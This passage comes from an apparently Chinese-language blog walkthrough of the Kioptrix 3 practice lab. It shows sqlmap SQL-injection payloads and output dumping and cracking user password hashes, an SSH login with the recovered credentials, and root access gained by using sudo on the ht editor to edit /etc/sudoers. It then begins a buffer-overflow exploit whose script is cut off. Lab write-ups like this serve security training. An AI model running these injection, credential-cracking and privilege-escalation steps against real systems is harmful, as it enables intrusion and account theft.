class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># sqlmap -u &quot;http://kioptrix3.com/gallery/gallery.php?id=1&quot; --batch -D gallery -T dev_accounts --dump</span></span><br><span class="line">        ___</span><br><span class="line">       __H__                            </span><br><span class="line"> ___ ___[)]_____ ___ ___  &#123;1.8.2<span class="comment">#stable&#125;                         </span></span><br><span class="line">|_ -| . [(]     | .<span class="string">&#x27;| . |            </span></span><br><span class="line"><span class="string">|___|_  [(]_|_|_|__,|  _|                                                                                                                    </span></span><br><span class="line"><span class="string">      |_|V...       |_|   https://sqlmap.org           </span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;</span>s responsibility to obey all applicable <span class="built_in">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="keyword">for</span> any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 10:57:16 /2024-10-02/</span><br><span class="line"></span><br><span class="line">[10:57:16] [INFO] resuming back-end DBMS <span class="string">&#x27;mysql&#x27;</span> </span><br><span class="line">[10:57:16] [INFO] testing connection to the target URL</span><br><span class="line">[10:57:16] [WARNING] the web server responded with an HTTP error code (500) <span class="built_in">which</span> could interfere with the results of the tests</span><br><span class="line">you have not declared cookie(s), <span class="keyword">while</span> server wants to <span class="built_in">set</span> its own (<span class="string">&#x27;PHPSESSID=8e9ed1a29ce...44e3f47d88&#x27;</span>). Do you want to use those [Y/n] Y</span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: <span class="built_in">id</span> (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: Boolean-based blind - Parameter replace (original value)</span><br><span class="line">    Payload: <span class="built_in">id</span>=(SELECT (CASE WHEN (5001=5001) THEN 1 ELSE (SELECT 7850 UNION SELECT 6816) END))</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)</span><br><span class="line">    Payload: <span class="built_in">id</span>=1 OR ROW(4327,5954)&gt;(SELECT COUNT(*),CONCAT(0x71627a7071,(SELECT (ELT(4327=4327,1))),0x7176707a71,FLOOR(RAND(0)*2))x FROM (SELECT 9657 UNION SELECT 7647 UNION SELECT 9691 UNION SELECT 4112)a GROUP BY x)</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: <span class="built_in">id</span>=1 AND (SELECT 2419 FROM (SELECT(SLEEP(5)))Zmmy)</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 6 columns</span><br><span class="line">    Payload: <span class="built_in">id</span>=1 UNION ALL SELECT NULL,CONCAT(0x71627a7071,0x78764251667270577962666b647771627a4876747a5376794b42757a7655507141644e50757a4c7a,0x7176707a71),NULL,NULL,NULL,NULL-- -</span><br><span class="line">---</span><br><span class="line">[10:57:16] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web server operating system: Linux Ubuntu 8.04 (Hardy Heron)</span><br><span class="line">web application technology: Apache 2.2.8, PHP, PHP 5.2.4</span><br><span class="line">back-end DBMS: MySQL &gt;= 4.1</span><br><span class="line">[10:57:16] [INFO] fetching columns <span class="keyword">for</span> table <span class="string">&#x27;dev_accounts&#x27;</span> <span class="keyword">in</span> database <span class="string">&#x27;gallery&#x27;</span></span><br><span class="line">[10:57:17] [INFO] retrieved: <span class="string">&#x27;id&#x27;</span>,<span class="string">&#x27;int(10)&#x27;</span></span><br><span class="line">[10:57:17] [INFO] retrieved: <span class="string">&#x27;username&#x27;</span>,<span class="string">&#x27;varchar(50)&#x27;</span></span><br><span class="line">[10:57:17] [INFO] retrieved: <span class="string">&#x27;password&#x27;</span>,<span class="string">&#x27;varchar(50)&#x27;</span></span><br><span class="line">[10:57:17] [INFO] fetching entries <span class="keyword">for</span> table <span class="string">&#x27;dev_accounts&#x27;</span> <span class="keyword">in</span> database <span class="string">&#x27;gallery&#x27;</span>  </span><br><span class="line">[10:57:17] [INFO] retrieved: <span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;0d3eccfb887aabd50f243b3f155c0f85&#x27;</span>,<span class="string">&#x27;dreg&#x27;</span></span><br><span class="line">[10:57:17] [INFO] retrieved: <span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;5badcaf789d3d1d09794d8f021f40f0e&#x27;</span>,<span class="string">&#x27;loneferret&#x27;</span></span><br><span class="line">[10:57:17] [INFO] recognized possible password hashes <span class="keyword">in</span> column <span class="string">&#x27;password&#x27;</span>     </span><br><span class="line"><span class="keyword">do</span> you want to store hashes to a temporary file <span class="keyword">for</span> eventual further processing with other tools [y/N] N</span><br><span class="line"><span class="keyword">do</span> you want to crack them via a dictionary-based attack? [Y/n/q] Y</span><br><span class="line">[10:57:17] [INFO] using <span class="built_in">hash</span> method <span class="string">&#x27;md5_generic_passwd&#x27;</span></span><br><span class="line">what dictionary <span class="keyword">do</span> you want to use?</span><br><span class="line">[1] default dictionary file <span class="string">&#x27;/usr/share/sqlmap/data/txt/wordlist.tx_&#x27;</span> (press Enter)</span><br><span class="line">[2] custom dictionary file</span><br><span class="line">[3] file with list of dictionary files</span><br><span class="line">&gt; 1</span><br><span class="line">[10:57:17] [INFO] using default dictionary</span><br><span class="line"><span class="keyword">do</span> you want to use common password suffixes? (slow!) [y/N] N</span><br><span class="line">[10:57:17] [INFO] starting dictionary-based cracking (md5_generic_passwd)</span><br><span class="line">[10:57:17] [INFO] starting 4 processes </span><br><span class="line">[10:57:24] [INFO] cracked password <span class="string">&#x27;Mast3r&#x27;</span> <span class="keyword">for</span> user <span class="string">&#x27;dreg&#x27;</span>              </span><br><span class="line">[10:57:46] [INFO] cracked password <span class="string">&#x27;starwars&#x27;</span> <span class="keyword">for</span> user <span class="string">&#x27;loneferret&#x27;</span>           </span><br><span class="line">Database: gallery                                       </span><br><span class="line">Table: dev_accounts</span><br><span class="line">[2 entries]</span><br><span class="line">+----+---------------------------------------------+------------+</span><br><span class="line">| <span class="built_in">id</span> | password                                    | username   |</span><br><span class="line">+----+---------------------------------------------+------------+</span><br><span class="line">| 1  | 0d3eccfb887aabd50f243b3f155c0f85 (Mast3r)   | dreg       |</span><br><span class="line">| 2  | 5badcaf789d3d1d09794d8f021f40f0e (starwars) | loneferret |</span><br><span class="line">+----+---------------------------------------------+------------+</span><br><span class="line"></span><br><span class="line">[10:57:54] [INFO] table <span class="string">&#x27;gallery.dev_accounts&#x27;</span> dumped to CSV file <span class="string">&#x27;/root/.local/share/sqlmap/output/kioptrix3.com/dump/gallery/dev_accounts.csv&#x27;</span></span><br><span class="line">[10:57:54] [WARNING] HTTP error codes detected during run:</span><br><span class="line">500 (Internal Server Error) - 1 <span class="built_in">times</span></span><br><span class="line">[10:57:54] [INFO] fetched data logged to text files under <span class="string">&#x27;/root/.local/share/sqlmap/output/kioptrix3.com&#x27;</span></span><br><span class="line">[10:57:54] [WARNING] your sqlmap version is outdated</span><br><span class="line"></span><br><span class="line">[*] ending @ 10:57:54 /2024-10-02/</span><br></pre></td></tr></table></figure>
<p>由 LFI 可知系统存在 <code>dreg</code> 和 <code>loneferret</code>
用户，经测可直接利用 sqlmap 获取到的密码登录 SSH</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202410022324183.jpg" /></p>
<h3 id="loneferret-用户提权">3.4. loneferret 用户提权</h3>
<p>根据 SQL 注入获得的用户信息 <code>loneferret/starwars</code> SSH
登录</p>
<p>loneferret 用户下 <code>sudo -l</code> 得可以root权限执行
<code>/usr/local/bin/ht</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">loneferret@Kioptrix3:~$ sudo -l</span><br><span class="line">User loneferret may run the following commands on this host:</span><br><span class="line">    (root) NOPASSWD: !/usr/bin/su</span><br><span class="line">    (root) NOPASSWD: /usr/local/bin/ht</span><br></pre></td></tr></table></figure>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://hte.sourceforge.net/readme.html">HT Editor</a><br />
This program is a file viewer, editor and analyzer for text, binary, and
(especially) executable files.</p>
</blockquote>
<table>
<colgroup>
<col style="width: 26%" />
<col style="width: 14%" />
<col style="width: 59%" />
</colgroup>
<thead>
<tr class="header">
<th>Command line options</th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>--</code></td>
<td></td>
<td>treat all additional parameters as file names</td>
</tr>
<tr class="even">
<td><code>-v</code></td>
<td><code>--version</code></td>
<td>show version and copyright on console</td>
</tr>
<tr class="odd">
<td><code>-h</code></td>
<td><code>--help</code></td>
<td>show help</td>
</tr>
<tr class="even">
<td><code>-t</code></td>
<td><code>--text</code></td>
<td>load file(s) in text editor mode</td>
</tr>
<tr class="odd">
<td><code>-b</code></td>
<td><code>--bin</code></td>
<td>load file(s) in hex editor mode</td>
</tr>
<tr class="even">
<td><code>-a</code></td>
<td><code>--auto</code></td>
<td>try to guess file type</td>
</tr>
</tbody>
</table>
<p>为此可利用 HT 以 root 权限编辑 sudoers、passwd 和 shadow
等文件来提权，示例</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ht -t /etc/sudoers</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202410031836405.jpg" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202410031836407.jpg" /></p>
<p>获得 root 权限</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">loneferret@Kioptrix3:~$ sudo su root</span><br><span class="line">root@Kioptrix3:/home/loneferret<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">root@Kioptrix3:/home/loneferret<span class="comment"># cd /root/</span></span><br><span class="line">root@Kioptrix3:~<span class="comment"># ls -al</span></span><br><span class="line">total 52</span><br><span class="line">drwx------  5 root root  4096 2011-04-17 08:59 .</span><br><span class="line">drwxr-xr-x 21 root root  4096 2011-04-11 16:54 ..</span><br><span class="line">-rw-------  1 root root     9 2011-04-18 11:49 .bash_history</span><br><span class="line">-rw-r--r--  1 root root  2227 2007-10-20 07:51 .bashrc</span><br><span class="line">-rw-r--r--  1 root root  1327 2011-04-16 08:13 Congrats.txt</span><br><span class="line">drwxr-xr-x 12 root root 12288 2011-04-16 07:26 ht-2.0.18</span><br><span class="line">-rw-------  1 root root   963 2011-04-12 19:33 .mysql_history</span><br><span class="line">-rw-------  1 root root   228 2011-04-18 11:09 .nano_history</span><br><span class="line">-rw-r--r--  1 root root   141 2007-10-20 07:51 .profile</span><br><span class="line">drwx------  2 root root  4096 2011-04-13 10:06 .ssh</span><br><span class="line">drwxr-xr-x  3 root root  4096 2011-04-15 23:30 .subversion</span><br></pre></td></tr></table></figure>
<h3 id="local-buffer-overflow">3.5. Local Buffer Overflow</h3>
<p>HT Editor 2.0.20 - Local Buffer Overflow (ROP)，SSH 登录
<code>loneferret/starwars</code> 调试</p>
<p>缓冲区溢出漏洞利用思路</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202409231106463.jpg" /></p>
<p>检查 ASLR 是否开启</p>
<blockquote>
<p>ASLR
是一种安全特性，通过随机化进程的地址空间，使得攻击者更难预测程序的内存布局，从而提高系统抵御攻击的能力。</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">loneferret@Kioptrix3:~$ <span class="built_in">cat</span> /proc/sys/kernel/randomize_va_space</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
<p><code>randomize_va_space</code> 的值可以设置为以下几个选项：</p>
<ul>
<li><strong>0</strong>：禁用
ASLR。内存地址不随机化，所有进程的地址空间在启动时是固定的。</li>
<li><strong>1</strong>：启用堆和栈的随机化。动态分配的内存（如堆和栈）会被随机化，但共享库和其他内存映射仍然有固定地址。</li>
<li><strong>2</strong>：启用共享库、堆和栈的随机化。几乎所有内存地址都会随机化，但仍然有些特定的内存区域可能不受影响。</li>
<li><strong>3</strong>：启用所有进程的完全随机化，包括所有内存区域。</li>
</ul>
<h4 id="常规利用">3.5.1. 常规利用</h4>
<p>ASLR 未开启保护，进一步测试 ht 缓冲区溢出漏洞</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">loneferret@Kioptrix3:~$ gdb -q /usr/local/bin/ht</span><br><span class="line">(gdb)</span><br><span class="line">(gdb) run `python -c <span class="string">&#x27;print &quot;\x41&quot;*4400&#x27;</span>`</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202410032229213.jpg" /></p>
<p>计算偏移量</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/usr/share/metasploit-framework/tools/exploit]</span><br><span class="line">└─<span class="comment"># ./pattern_create.rb -l 4400                                      </span></span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp9Fq0Fq1Fq2Fq3Fq4Fq5Fq</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>BufferOverflow.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line">buff=<span class="string">&quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx